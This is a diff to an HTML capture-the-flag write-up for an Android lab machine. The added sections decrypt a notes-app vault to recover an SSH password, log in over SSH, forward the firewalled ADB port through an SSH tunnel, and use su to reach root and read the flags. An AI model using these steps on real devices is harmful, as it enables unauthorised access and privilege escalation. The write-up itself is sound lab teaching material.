@@ -794,7 +794,7 @@ A few seconds, and presto, you have access to the source code<br></p>
 <div class="sect3">
 <h4 id="_4_understand_encryption_system">4.Understand encryption system</h4>
 <div class="paragraph">
-<p>We leave you the choice, either you will search by yourself, or you will continue reading and everything will be ready for you</p>
+<p>We leave you the choice, either you search by yourself, or you continue reading and everything will be ready for you</p>
 </div>
 <div class="sect4">
 <h5 id="_1_important_functions">1. Important functions</h5>
@@ -817,7 +817,7 @@ A few seconds, and presto, you have access to the source code<br></p>
 </div>
 </div>
 <div class="paragraph">
-<p>We have to reproduce the getMasterKey () function<br>
+<p>We had to reproduce the getMasterKey () function<br>
 This function will return a key to us, with which we can decrypt the vault&#8217;s entries ( encrypted with AES ).<br>
 (If you want more details, go see the code )</p>
 </div>
@@ -862,13 +862,175 @@ Do not hesitate to follow the diagram with a finger to fully understand
 </div>
 </div>
 </div>
+<div class="sect3">
+<h4 id="_5_make_a_script">5. Make a script</h4>
+<div class="paragraph">
+<p>After understanding the code, we had to make a script, because decoding AES on paper, that&#8217;s too much hard.</p>
+</div>
+<div class="paragraph">
+<p>So , here is the <a href="clean.py">script</a>. We took the time to comment on all of the code to ensure it was understood.</p>
+</div>
+<div class="paragraph">
+<p>Now, let&#8217;s use it , that&#8217;s so simple , you just have to do<br></p>
+</div>
+<div class="paragraph">
+<p><code>python script.py notes_db panama.android.notes_preferences.xml --vaultonly</code></p>
+</div>
+<div class="paragraph">
+<p>--vaultonly parameter tell the script not to display entries that are not in the vault</p>
+</div>
+<div class="admonitionblock note">
+<table>
+<tr>
+<td class="icon">
+<i class="fa icon-note" title="Note"></i>
+</td>
+<td class="content">
+Obviously, you must copy these two files in the same folder as the script
+</td>
+</tr>
+</table>
+</div>
+<div class="paragraph">
+<p>Now, check the result</p>
+</div>
+<div class="listingblock">
+<div class="content">
+<pre>########## MemorixVault ##########
+Dev :
+switch to key-based auth, for now use password w@ckySystem99 ---------&gt; Not checked
+enable remote access ---------&gt; Checked
+set up backup synchronization ---------&gt; Checked</pre>
+</div>
+</div>
+<div class="paragraph">
+<p>Nice ! We got a password ! <strong>w@ckySystem99</strong></p>
+</div>
+</div>
+</div>
+<div class="sect2">
+<h3 id="_6_use_this_password">6. Use this password</h3>
+<div class="paragraph">
+<p>Remember our ports table :</p>
+</div>
+<table class="tableblock frame-all grid-all stretch">
+<colgroup>
+<col style="width: 50%;">
+<col style="width: 50%;">
+</colgroup>
+<thead>
+<tr>
+<th class="tableblock halign-left valign-top">Port</th>
+<th class="tableblock halign-left valign-top">Service</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td class="tableblock halign-left valign-top"><p class="tableblock">5555</p></td>
+<td class="tableblock halign-left valign-top"><p class="tableblock">ADB</p></td>
+</tr>
+<tr>
+<td class="tableblock halign-left valign-top"><p class="tableblock">8022</p></td>
+<td class="tableblock halign-left valign-top"><p class="tableblock">SSH</p></td>
+</tr>
+<tr>
+<td class="tableblock halign-left valign-top"><p class="tableblock">8384</p></td>
+<td class="tableblock halign-left valign-top"><p class="tableblock">Syncthing WEB GUI</p></td>
+</tr>
+</tbody>
+<tfoot>
+<tr>
+<td class="tableblock halign-left valign-top"><p class="tableblock">22000</p></td>
+<td class="tableblock halign-left valign-top"><p class="tableblock">Syncthing TCP</p></td>
+</tr>
+</tfoot>
+</table>
+<div class="paragraph">
+<p>We had SSH port , let&#8217;s try our password !</p>
+</div>
+<div class="paragraph">
+<p>But..We don&#8217;t have any username ?</p>
+</div>
+<div class="paragraph">
+<p>Don&#8217;t worry , try with whatever you want</p>
+</div>
+<div class="paragraph">
+<p><code>ssh <a href="mailto:hacker@oreo.local">hacker@oreo.local</a> -p 8022</code></p>
+</div>
+<div class="paragraph">
+<p>And we get a Termux shell.</p>
+</div>
+<div class="paragraph">
+<p>A little whoami and :</p>
+</div>
+<div class="listingblock">
+<div class="content">
+<pre>$ whoami
+u0_a74
+$ id
+uid=10074(u0_a74) gid=10074(u0_a74) groups=3003(inet),9997(everybody),20074(u0_a74_cache),50074(all_a74)</pre>
+</div>
+</div>
+<div class="paragraph">
+<p>We are not root :)</p>
+</div>
+<div class="paragraph">
+<p>Let&#8217;s see termux file</p>
+</div>
+<div class="listingblock">
+<div class="content">
+<pre>$ ls
+drozer-agent-2.3.4.apk  user.txt</pre>
+</div>
+</div>
+<div class="paragraph">
+<p>Oh , the user flag</p>
+</div>
+<div class="listingblock">
+<div class="content">
+<pre>$ cat user.txt
+af91f6549d776d17cXXXXXXXXXXXXXXX</pre>
+</div>
+</div>
+<div class="paragraph">
+<p>Yeees the user flag , but now , how can we become root ?</p>
+</div>
+<div class="paragraph">
+<p>Remember , the 5555 port , it was protected with a firewall, but do you know the power of ssh ?</p>
+</div>
+<div class="paragraph">
+<p>In SSH there is something called port forwarding , with this we are able to redirect a remote private port to a local port (among others), through an ssh tunnel.</p>
+</div>
+<div class="paragraph">
+<p>Let&#8217;s do it :</p>
+</div>
+<div class="paragraph">
+<p><code>ssh t@192.168.0.77 -p 8022 -L 6666:127.0.0.1:5555 -N</code></p>
+</div>
+<div class="paragraph">
+<p>This command will map remote port 5555 to local port 6666, let it run in the background</p>
+</div>
+<div class="paragraph">
+<p>And we just have to connect with adb</p>
+</div>
+<div class="listingblock">
+<div class="content">
+<pre>adb connect 127.0.0.1 6666
+adb shell
+x86_64:/ $ su
+x86_64:/ $ whoami
+root
+x86_64:/ # cat /data/root.txt
+3b4ae23cd7323dedfXXXXXXXXXXXXXXX</pre>
+</div>
+</div>
 </div>
 </div>
 </div>
 </div>
 <div id="footer">
 <div id="footer-text">
-Last updated 2020-07-15 20:37:19 +0200
+Last updated 2020-07-15 23:33:39 +0200
 </div>
 </div>
 <style>
